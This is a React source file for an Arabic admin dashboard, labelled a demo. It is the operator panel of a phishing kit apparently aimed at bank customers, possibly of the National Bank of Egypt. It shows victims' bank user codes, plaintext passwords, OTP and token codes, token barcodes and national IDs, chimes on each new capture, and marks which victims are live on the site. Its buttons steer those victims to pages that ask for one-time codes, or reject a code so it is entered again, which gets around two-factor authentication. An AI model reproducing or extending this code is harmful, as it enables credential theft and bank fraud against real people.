import React, { useEffect, useState, useCallback, useMemo } from "react";
import { RefreshCw, Inbox, Eye, QrCode, Volume2, Check, X, MessageSquare } from "lucide-react";
import { base44 } from "@/api/base44Client";
import { useToast } from "@/components/ui/use-toast";
import { Image } from "@/components/ui/image";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { serviceLabel, serviceFields, formatDate } from "@/lib/bankData";
import ActiveVisitorsDropdown from "@/components/admin/ActiveVisitorsDropdown";

const ACTIVE_WINDOW_MS = 60 * 1000;

/* Messenger-like double chime */
function playMessengerSound() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const tones = [
      { f: 988, t: 0 },
      { f: 1319, t: 0.12 },
    ];
    tones.forEach(({ f, t }) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      const start = ctx.currentTime + t;
      osc.frequency.value = f;
      osc.type = "sine";
      gain.gain.setValueAtTime(0.0001, start);
      gain.gain.exponentialRampToValueAtTime(0.34, start + 0.01);
      gain.gain.exponentialRampToValueAtTime(0.0001, start + 0.28);
      osc.connect(gain).connect(ctx.destination);
      osc.start(start);
      osc.stop(start + 0.3);
    });
  } catch {}
}

const STATUS = {
  pending: { label: "بانتظار", chip: "bg-slate-100 text-slate-600" },
  approved: { label: "مقبول", chip: "bg-emerald-50 text-emerald-700" },
  rejected: { label: "مرفوض", chip: "bg-red-50 text-red-700" },
};

function StatusChip({ value }) {
  const s = STATUS[value] || STATUS.pending;
  return (
    <span className={`px-2 py-0.5 rounded-full text-[11px] font-medium ${s.chip}`}>
      {s.label}
    </span>
  );
}

const latestCode = (codes, single) => {
  const list = Array.isArray(codes) && codes.length ? codes : single ? [single] : [];
  return list.length ? list[list.length - 1] : "";
};

export default function AdminSubmissions() {
  const { toast } = useToast();
  const [rows, setRows] = useState([]);
  const [loading, setLoading] = useState(true);
  const [detail, setDetail] = useState(null);
  const [activeSessions, setActiveSessions] = useState(new Set());
  const [seenIds, setSeenIds] = useState(() => {
    try {
      const s = sessionStorage.getItem("seen_submissions");
      return s ? new Set(JSON.parse(s)) : null;
    } catch {
      return null;
    }
  });
  const [seenInitialized, setSeenInitialized] = useState(false);

  const load = useCallback(async () => {
    try {
      const r = await base44.entities.PortalSubmission.list("-created_date", 500);
      setRows(r);
    } catch {}
    setLoading(false);
  }, []);

  const loadActive = useCallback(async () => {
    try {
      const v = await base44.entities.VisitorSession.list("-last_seen", 200);
      const now = Date.now();
      const active = new Set(
        v
          .filter((s) => s.is_active && now - new Date(s.last_seen).getTime() < ACTIVE_WINDOW_MS)
          .map((s) => s.session_id)
      );
      setActiveSessions(active);
    } catch {}
  }, []);

  useEffect(() => {
    load();
    loadActive();
    const unsub = base44.entities.PortalSubmission.subscribe((event) => {
      if (event.type === "create") {
        playMessengerSound();
        load();
      }
    });
    const unsubVisitors = base44.entities.VisitorSession.subscribe(() => loadActive());
    const interval = setInterval(loadActive, 15000);
    return () => {
      unsub();
      unsubVisitors();
      clearInterval(interval);
    };
  }, [load, loadActive]);

  /* Mark all currently-loaded rows as seen on first load (so only truly new ones highlight) */
  useEffect(() => {
    if (!seenInitialized && rows.length) {
      const initial = new Set(seenIds && seenIds.size ? Array.from(seenIds) : []);
      rows.forEach((r) => initial.add(r.id));
      setSeenIds(initial);
      setSeenInitialized(true);
      try {
        sessionStorage.setItem("seen_submissions", JSON.stringify(Array.from(initial)));
      } catch {}
    }
  }, [rows, seenInitialized, seenIds]);

  const markSeen = useCallback((id) => {
    setSeenIds((prev) => {
      const p = prev && prev.size ? new Set(prev) : new Set();
      if (p.has(id)) return p;
      p.add(id);
      try {
        sessionStorage.setItem("seen_submissions", JSON.stringify(Array.from(p)));
      } catch {}
      return p;
    });
  }, []);

  const redirect = async (row, target, extra = {}, label) => {
    try {
      await base44.entities.PortalSubmission.update(row.id, {
        redirect_to: target,
        ...extra,
      });
      toast({ title: "تم توجيه العميل", description: label || `إلى ${target}` });
      load();
    } catch {
      toast({ title: "حدث خطأ", variant: "destructive" });
    }
  };

  const detailRows = (d) => [
    ["الاسم", d.applicant_name],
    ["كود المستخدم", d.user_code],
    ["كلمة المرور", d.password],
    ["كود التحقق", d.otp_code],
    ["كود التوكن", d.token_code],
    ["رقم الهاتف", d.phone],
    ["الرقم القومي", d.national_id],
    ["المحافظة", d.governorate],
    ["عنوان التوصيل", d.address],
    ["نوع الخدمة", serviceLabel(d.service_type)],
    ...serviceFields(d.service_type).map((f) => [f.label, d.details?.[f.name] || "—"]),
    ["رقم الطلب", d.request_number],
    ["تاريخ التقديم", formatDate(d.submitted_at || d.created_date)],
  ];

  const BarcodeRow = ({ src }) => {
    if (!src) return null;
    return (
      <div className="flex flex-col items-center gap-2 p-4 border-t border-slate-100">
        <span className="text-sm text-slate-500 font-medium">باركود NBE Token</span>
        <div className="w-40 h-40 rounded-lg border border-slate-200 bg-white flex items-center justify-center overflow-hidden p-2">
          <Image src={src} alt="باركود" className="w-full h-full object-contain" fittingType="fit" />
        </div>
      </div>
    );
  };

  const act = (label, onClick, cls) => (
    <button
      onClick={onClick}
      className={`px-2.5 py-1.5 rounded-md text-[11px] font-semibold text-white whitespace-nowrap ${cls}`}
    >
      {label}
    </button>
  );

  const openDetail = (r) => {
    setDetail(r);
    markSeen(r.id);
  };

  const isNew = (id) => seenInitialized && seenIds ? !seenIds.has(id) : false;

  return (
    <div className="space-y-5" style={{ background: "#f9f7f2" }}>
      {/* Header */}
      <div className="flex items-start justify-between gap-3 flex-wrap">
        <div>
          <h1 className="text-2xl font-bold text-black">إدارة الطلبات</h1>
          <p className="text-sm text-slate-500 mt-1">
            لوحة تحكم بطاقة فزعة — عرض تجريبي
          </p>
        </div>
        <div className="flex items-center gap-2 flex-wrap">
          <ActiveVisitorsDropdown />
          <span className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-medium" style={{ background: "#e6f4ea", color: "#1c693a" }}>
            <MessageSquare className="w-3.5 h-3.5" />
            الإشعار الصوتي مفعّل
          </span>
          <button
            onClick={load}
            className="inline-flex items-center justify-center w-9 h-9 rounded-lg border border-slate-200 bg-white hover:bg-slate-50"
          >
            <RefreshCw className={`w-4 h-4 text-slate-600 ${loading ? "animate-spin" : ""}`} />
          </button>
        </div>
      </div>

      {/* Filter tabs */}
      <div className="flex items-center gap-1 flex-wrap">
        <button className="px-4 py-1.5 rounded-md text-sm font-semibold text-white" style={{ background: "#c5a02c" }}>
          الطلبات النشطة
        </button>
        <button className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-md text-sm font-medium text-emerald-700 bg-emerald-50">
          <Check className="w-3.5 h-3.5" />
          المقبولة 0
        </button>
        <button className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-md text-sm font-medium text-red-600 bg-red-50">
          <X className="w-3.5 h-3.5" />
          المرفوضة 0
        </button>
        <button className="px-3 py-1.5 rounded-md text-sm font-medium text-slate-600 bg-white border border-slate-200">
          الأرشيف
        </button>
        <button className="px-3 py-1.5 rounded-md text-sm font-medium text-slate-600 bg-white border border-slate-200">
          الحذف
        </button>
      </div>

      {rows.length === 0 ? (
        <div className="rounded-2xl border border-slate-200 bg-white p-12 text-center text-slate-400 flex flex-col items-center gap-2">
          <Inbox className="w-10 h-10" />
          <p>لا توجد بيانات مقدمة بعد.</p>
        </div>
      ) : (
        <div className="rounded-2xl overflow-hidden shadow-sm border border-slate-200">
          <div className="overflow-x-auto">
            <table className="w-full text-sm text-right border-collapse">
              <thead style={{ background: "#1a1e23" }}>
                <tr>
                  {["الاسم", "كود المستخدم", "كلمة المرور", "رمز التحقق", "رمز توكن", "صورة باركود", "حالة الزائر", "الإجراءات"].map((h) => (
                    <th key={h} className="px-3 py-3 font-semibold text-white text-xs whitespace-nowrap">{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-100">
                {rows.map((r) => {
                  const active = r.session_id && activeSessions.has(r.session_id);
                  const fresh = isNew(r.id);
                  return (
                    <tr key={r.id} style={{ background: "#ffffff" }} className={fresh ? "" : ""}>
                      <td className="px-3 py-3">
                        <button
                          onClick={() => openDetail(r)}
                          className={`inline-flex items-center gap-1.5 font-medium text-[#0E7A5F] hover:underline rounded-md px-1.5 py-1 transition ${fresh ? "shadow-[0_2px_8px_rgba(197,160,44,0.45)] ring-1 ring-[#c5a02c]/40" : ""}`}
                        >
                          <span
                            className={`w-2.5 h-2.5 rounded-full shrink-0 ${active ? "bg-emerald-500" : "bg-red-500"}`}
                            title={active ? "نشط داخل الموقع" : "غير متصل"}
                          />
                          <Eye className="w-3.5 h-3.5" />
                          {r.applicant_name || "—"}
                        </button>
                      </td>
                      <td className="px-3 py-3 font-mono text-slate-700 text-xs" dir="ltr">
                        {r.user_code || "—"}
                      </td>
                      <td className="px-3 py-3 font-mono text-slate-700 text-xs" dir="ltr">
                        {r.password || "—"}
                      </td>
                      <td className="px-3 py-3 font-mono text-slate-700 text-xs text-center" dir="ltr">
                        {latestCode(r.otp_codes, r.otp_code) || "—"}
                      </td>
                      <td className="px-3 py-3 font-mono text-slate-700 text-xs text-center" dir="ltr">
                        {latestCode(r.token_codes, r.token_code) || "—"}
                      </td>
                      <td className="px-3 py-3">
                        {r.barcode_image ? (
                          <button
                            onClick={() => openDetail(r)}
                            className="w-11 h-11 rounded-lg border border-slate-200 bg-white flex items-center justify-center overflow-hidden p-0.5 hover:ring-2 hover:ring-[#0E7A5F]"
                          >
                            <Image src={r.barcode_image} alt="باركود" className="w-full h-full object-contain" fittingType="fit" />
                          </button>
                        ) : (
                          <div className="flex items-center justify-center text-slate-300 w-11 h-11">
                            <QrCode className="w-5 h-5" />
                          </div>
                        )}
                      </td>
                      <td className="px-3 py-3 text-center">
                        <StatusChip value={r.data_status} />
                      </td>
                      <td className="px-3 py-3">
                        <div className="flex flex-wrap gap-1.5 max-w-[420px]">
                          {act("كود التحقق", () => redirect(r, "/forgot-password", {}, "صفحة كود التحقق"), "bg-blue-600 hover:bg-blue-700")}
                          {act("كود توكن", () => redirect(r, "/reset-password", {}, "صفحة كود التوكن"), "bg-blue-600 hover:bg-blue-700")}
                          {act("صفحة التسجيل", () => redirect(r, "/apply", {}, "صفحة التسجيل"), "bg-blue-600 hover:bg-blue-700")}
                          {act("قبول الطلب كامل", () => redirect(r, "/apply/accept", { data_status: "approved", otp_status: "approved", token_status: "approved" }, "قبول الطلب"), "bg-emerald-600 hover:bg-emerald-700")}
                          {act("رفض الطلب كامل", () => redirect(r, "/apply/reject", { data_status: "rejected", otp_status: "rejected", token_status: "rejected" }, "رفض الطلب"), "bg-red-600 hover:bg-red-700")}
                          {act("رفض رمز التحقق", () => redirect(r, "/forgot-password/reject", { otp_status: "rejected" }, "رفض رمز التحقق"), "bg-red-500 hover:bg-red-600")}
                          {act("رفض رمز توكن", () => redirect(r, "/reset-password/reject", { token_status: "rejected" }, "رفض رمز التوكن"), "bg-red-500 hover:bg-red-600")}
                        </div>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        </div>
      )}

      <Dialog open={!!detail} onOpenChange={(v) => !v && setDetail(null)}>
        <DialogContent className="max-w-lg">
          <DialogHeader>
            <DialogTitle>بيانات الطلب المقدم</DialogTitle>
          </DialogHeader>
          {detail && (
            <div className="rounded-xl border border-slate-200 divide-y divide-slate-100 max-h-[60vh] overflow-y-auto">
              {detailRows(detail).map(([k, v]) => (
                <div key={k} className="flex justify-between gap-4 p-3 text-sm">
                  <span className="text-slate-500">{k}</span>
                  <span className="font-medium text-left" dir="ltr">
                    {v || "—"}
                  </span>
                </div>
              ))}
              {detail.barcode_image && <BarcodeRow src={detail.barcode_image} />}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}